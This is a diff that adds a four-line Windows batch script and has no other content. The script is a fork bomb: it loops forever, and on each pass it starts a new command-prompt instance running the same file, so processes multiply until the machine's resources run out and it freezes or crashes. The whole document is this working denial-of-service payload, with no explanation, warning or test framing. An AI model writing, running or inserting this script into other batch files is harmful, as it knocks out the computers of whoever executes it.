@@ -1,0 +1,4 @@
+@echo off
+:fork
+start "" cmd /c %~f0
+goto fork
